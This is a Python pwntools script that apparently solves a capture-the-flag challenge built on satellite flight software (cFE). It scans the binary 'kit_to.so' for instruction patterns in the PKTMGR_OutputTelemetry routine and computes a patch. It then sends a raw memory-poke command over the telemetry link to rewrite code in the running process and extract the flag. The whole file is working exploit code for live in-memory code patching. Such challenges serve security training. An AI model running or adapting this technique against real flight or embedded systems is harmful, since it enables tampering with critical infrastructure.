import os,sys,time
from binascii import hexlify, unhexlify
from struct import pack, unpack 

from pwnlib.tubes.remote import remote
from pwnlib.elf import ELF


OutputTelemetry_Base = 0x24B7
SourceInstr          = 0x25D5
PatchTarget          = 0x2615

def findOffsets():
    File = os.getenv("DIR", "/data") + os.sep + "kit_to.so"
    f = ELF(File)
    BaseAddr = f.symbols['PKTMGR_OutputTelemetry']
    print("PKTMGR_OutputTelemetry @ %08x"  % BaseAddr) 
    searchPattern = unhexlify("8b8344010000" + "8db0fa010000")
    addr = BaseAddr + 0xF0
    while True:
        target = f.read(addr, len(searchPattern))
        if searchPattern == target:
            break
        addr += 1
    addr += 5 + len(searchPattern)
    while True:
        target = f.read(addr, 1)
        if target == b'\x8b':
            break
        addr += 1
    movAddr = addr
    searchPattern = unhexlify("8d8b48010000" + "51" + "6a00" + "52")
    while True:
        target = f.read(addr, len(searchPattern))
        if searchPattern == target:
            break
        addr += 1
    addr += len(searchPattern)
    patchOffset = addr

    return (movAddr, patchOffset - BaseAddr)


def sendPoke(sock, patch, offset, bits=32):

    CmdHeader = unhexlify("1888C000004D0388")
    Params1   = pack("BBH", bits, 1, 0) # DataSize (bits), memytype (1 = Ram), padding 16bits
    data      = patch # pack(">I", patch)  # "8B95D4F7"
    symOffset = pack("<I", offset)
    symName   = b"PKTMGR_OutputTelemetry"
    symName   = symName + b"\x00" * (64 - len(symName))

    msg = CmdHeader + Params1 + data + symOffset + symName
    sock.send( msg )
    print("Poke Sent")


def findGoalPatch(movAddr):
    File = os.getenv("DIR", "/data") + os.sep + "kit_to.so"
    f = ELF(File)

    movInstr = f.read(movAddr, 6)

    print("Mov Instruction", hexlify(movInstr))
    
    patch = b"\x8b\x95" + movInstr[2:4]
    #patch = patch[::-1]
    print("Patch", hexlify(patch))
    return patch

def sendEnableTlm(sock):
    msg = unhexlify("1880C0000011079A3132372E302E302E3100000000000000")  
    sock.send( msg )
    print("Enabled TLM")

if __name__ == "__main__":
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31360))

    sockChal = remote(Host, Port)
    print("Connect to ", Host, Port)
    sys.stdout.flush()

    ticket = os.getenv("TICKET", "")
    if len(ticket):
        sockChal.recvline()
        sockChal.send(ticket + "\n")

    sockChal.recvuntil(b'tcp:', drop=True)
    line = sockChal.recvline().strip()
    print("Connecting to", line)
    sys.stdout.flush()

    sockChal.recvuntil(b'CFE_ES_Main entering OPERATIONAL state', drop=True)
    time.sleep(5)
    TlmHost,TlmPort = line.split(b":")

    sockTlm  = remote(TlmHost, TlmPort)

    movAddr, patchOffset = findOffsets()
    sendPoke(sockTlm, findGoalPatch(movAddr), patchOffset)
    time.sleep(1)
    sendEnableTlm(sockTlm)
    
    sockTlm.recvuntil(b"flag{")
    flag = "flag{" + sockTlm.recvuntil(b"}").decode('utf-8')
    print(flag)
    sys.stdout.flush()
